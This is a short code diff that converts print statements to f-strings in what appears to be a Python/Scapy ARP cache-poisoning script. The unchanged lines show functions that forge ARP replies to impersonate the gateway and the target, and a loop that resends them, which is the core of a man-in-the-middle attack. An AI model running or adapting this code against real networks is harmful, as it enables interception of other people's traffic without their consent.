@@ -32,7 +32,7 @@ def impersonateGateway():
     # Victim's IP address that we want to poison;
     poisonedTarget.pdst = TARGET_IP
 
-    print('Poisoning target ' + str(poisonedTarget.pdst))
+    print(f'Poisoning target {str(poisonedTarget.pdst)}')
     send(poisonedTarget, verbose=False)
 
 def impersonateTarget():
@@ -41,7 +41,7 @@ def impersonateTarget():
     poisonedGateway.op = 2
     poisonedGateway.psrc = TARGET_IP
     poisonedGateway.pdst = GATEWAY_IP
-    print('Poisoning gateway ' + str(poisonedGateway.pdst))
+    print(f'Poisoning gateway {str(poisonedGateway.pdst)}')
     send(poisonedGateway, verbose=False)
 
 while True:
